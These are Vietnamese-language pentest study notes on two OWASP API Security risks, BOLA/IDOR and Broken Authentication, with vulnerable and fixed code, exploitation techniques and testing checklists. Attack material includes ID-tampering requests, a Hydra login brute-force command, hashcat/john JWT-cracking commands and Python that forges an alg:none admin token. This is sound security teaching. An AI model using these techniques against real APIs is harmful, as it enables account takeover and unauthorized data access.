# OWASP API Security Top 10 — Notes

## 📚 Mục lục

- [API1:2023 — Broken Object Level Authorization (BOLA)](#api12023--broken-object-level-authorization-bola)
  - [Khái niệm cốt lõi](#khái-niệm-cốt-lõi)
  - [Root Cause](#root-cause)
  - [Các loại Object ID thường gặp](#các-loại-object-id-thường-gặp)
  - [Các cách khai thác](#các-cách-khai-thác)
  - [Checklist khi test](#checklist-khi-test)
- [API2:2023 — Broken Authentication](#api22023--broken-authentication)
  - [Khái niệm cốt lõi](#khái-niệm-cốt-lõi-1)
  - [Root Cause](#root-cause-1)
  - [Các cách khai thác](#các-cách-khai-thác-1)
  - [Checklist khi test](#checklist-khi-test-1)

---

# API1:2023 — Broken Object Level Authorization (BOLA)

## Khái niệm cốt lõi

BOLA (hay còn gọi là IDOR — Insecure Direct Object Reference) xảy ra khi API **không kiểm tra xem user hiện tại có quyền truy cập vào object được yêu cầu hay không**, chỉ dựa vào ID do client gửi lên.

```
User A  →  GET /api/orders/1001  →  ✅ (order của A)
User A  →  GET /api/orders/1002  →  ✅ (order của B) ← BOLA!
```

---

## Root Cause

Server nhận ID từ request → query DB → trả về data **mà không verify ownership**.

```python
# Vulnerable
@app.get("/api/orders/{order_id}")
def get_order(order_id: int):
    return db.query(Order).filter(Order.id == order_id).first()

# Fixed
@app.get("/api/orders/{order_id}")
def get_order(order_id: int, current_user = Depends(get_current_user)):
    order = db.query(Order).filter(Order.id == order_id).first()
    if order.user_id != current_user.id:
        raise HTTPException(403)
    return order
```

---

## Các loại Object ID thường gặp

| Loại | Ví dụ |
|------|-------|
| Sequential integer | `/users/1`, `/users/2` |
| UUID | `/docs/550e8400-e29b-41d4-a716-446655440000` |
| Slug | `/profile/john_doe` |
| Encoded | `/file/dXNlcjEyMw==` (base64) |
| Indirect | `/me/orders` nhưng body chứa `user_id` |

> UUID không phải là fix — nếu không có authz check, đoán được hay leak ra là xong.

---

## Các cách khai thác

### 1. ID Enumeration (Sequential)
```http
GET /api/users/100/profile HTTP/1.1
GET /api/users/101/profile HTTP/1.1
GET /api/users/102/profile HTTP/1.1
```
Dùng Burp Intruder / ffuf để fuzz range.

---

### 2. ID Swap trong Request Body / Parameter
```http
# Request gốc của user A
POST /api/transfer HTTP/1.1
{"from_account": "ACC-001", "to_account": "ACC-999", "amount": 100}

# Thay from_account thành account của victim
{"from_account": "ACC-002", "to_account": "ACC-999", "amount": 100}
```

---

### 3. HTTP Method Tampering kết hợp BOLA
```http
# Chỉ check authz trên GET, không check PUT/DELETE
DELETE /api/posts/55 HTTP/1.1
Authorization: Bearer <token_of_other_user>
```

---

### 4. Nested Resource / Indirect Reference
```http
GET /api/users/99/documents HTTP/1.1
GET /api/teams/5/members HTTP/1.1
```
Thay ID của resource cha để leo sang object của user khác.

---

### 5. Mass Assignment / Hidden Field
```http
PATCH /api/profile HTTP/1.1
{"username": "me", "user_id": 42}   ← inject user_id của victim
```
Server dùng `user_id` từ body thay vì từ JWT.

---

### 6. BOLA trên Export / Download Endpoint
```http
GET /api/reports/export?report_id=789
GET /api/invoices/download/456
```
Các endpoint export thường bị bỏ sót authz check.

---

### 7. GraphQL — Object ID trong Query
```graphql
query {
  user(id: "victim_id") {
    email
    phone
    address
  }
}
```

---

### 8. Predictable Token / Reference trong Response
Khi response trả về ID của object liên quan:
```json
{"order_id": 1001, "user_id": 55, "invoice_id": 3021}
```
Dùng `invoice_id` hoặc `user_id` để pivot sang endpoint khác.

---

## Checklist khi test

- [ ] Tạo 2 account (A và B), lấy ID của object thuộc B, dùng token A để truy cập
- [ ] Fuzz tất cả numeric/UUID parameter trong path, query string, body, header
- [ ] Test cả GET / POST / PUT / PATCH / DELETE
- [ ] Kiểm tra endpoint export, download, preview
- [ ] Kiểm tra nested resource (`/users/{id}/...`)
- [ ] Kiểm tra GraphQL introspection + query với ID tùy ý
- [ ] Decode base64/JWT để tìm hidden ID field

---

# API2:2023 — Broken Authentication

## Khái niệm cốt lõi

Broken Authentication xảy ra khi API **triển khai cơ chế xác thực sai hoặc thiếu**, cho phép attacker chiếm quyền truy cập tài khoản hoặc bypass hoàn toàn bước xác thực.

```
Attacker  →  POST /api/login (brute force)  →  200 OK + token ← No rate limit!
Attacker  →  GET /api/admin  (no token)     →  200 OK         ← Missing auth check!
```

---

## Root Cause

| Nguyên nhân | Mô tả |
|-------------|-------|
| Không có rate limiting | Brute force mật khẩu / OTP thoải mái |
| Token yếu / predictable | JWT `alg: none`, secret yếu, token tuần tự |
| Thiếu kiểm tra token | Endpoint không verify token hoặc chỉ check format |
| Credential stuffing | Không chặn login với leaked credential list |
| Lộ token qua URL | Token nằm trong query string, bị log lại |
| Không có expiry | Token không hết hạn, revoke không hoạt động |

---

## Các cách khai thác

### 1. Brute Force / Credential Stuffing
```http
POST /api/login HTTP/1.1
{"username": "admin", "password": "password123"}
```
Không có rate limit → dùng Burp Intruder / Hydra để brute force.

```bash
# [ATTACKER]
hydra -L users.txt -P passwords.txt target.lab http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

---

### 2. JWT Algorithm Confusion — `alg: none`
```python
# Tạo JWT không cần signature
import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b"=")
token   = f"{header.decode()}.{payload.decode()}."  # signature rỗng
```

---

### 3. JWT Weak Secret — Brute Force
```bash
# [ATTACKER]
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
# hoặc
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
```
Sau khi crack được secret → tự ký token với role tùy ý.

---

### 4. JWT Algorithm Confusion — RS256 → HS256
Server dùng RS256 (public/private key). Nếu server không validate `alg`:
```
1. Lấy public key của server (thường public)
2. Đổi alg từ RS256 → HS256
3. Ký token bằng public key như HMAC secret
→ Server verify bằng public key → pass!
```

---

### 5. OTP / 2FA Bypass
```http
# Brute force 4-6 digit OTP (10000–1000000 khả năng)
POST /api/verify-otp HTTP/1.1
{"otp": "0000"}
{"otp": "0001"}
...
```
Không có rate limit + không có lockout → enumerate hết OTP.

---

### 6. Token Leak qua URL / Logs
```http
# Token trong query string → bị lưu vào server log, browser history, Referer header
GET /api/user/profile?token=eyJhbGc... HTTP/1.1
```

---

### 7. Missing Authentication trên Sensitive Endpoint
```http
# Endpoint không yêu cầu token
GET /api/admin/users HTTP/1.1
→ 200 OK (không cần auth)

POST /api/password-reset HTTP/1.1
{"user_id": 55}
→ Reset password không cần verify ownership
```

---

### 8. Password Reset Token Predictable / Reusable
```http
# Token reset dạng timestamp hoặc sequential
GET /api/reset?token=1720000001  ← timestamp
GET /api/reset?token=1720000002
# Hoặc token không expire / dùng lại được nhiều lần
```

---

### 9. OAuth Misconfiguration
```
- redirect_uri không được validate → token bị redirect về attacker server
- state parameter không có → CSRF trên OAuth flow
- implicit flow leak token trong URL fragment
```

---

## Checklist khi test

- [ ] Test brute force login — có rate limit / lockout không?
- [ ] Decode JWT, kiểm tra `alg`, thử đổi sang `none`
- [ ] Brute force JWT secret bằng hashcat/john
- [ ] Thử đổi `alg` từ RS256 → HS256 với public key
- [ ] Brute force OTP — có rate limit không?
- [ ] Kiểm tra token có nằm trong URL / log không
- [ ] Gọi sensitive endpoint không kèm token → có trả 401 không?
- [ ] Kiểm tra token expiry — token cũ còn dùng được không?
- [ ] Kiểm tra password reset token — có predictable / reusable không?
- [ ] Kiểm tra OAuth `redirect_uri` validation và `state` parameter
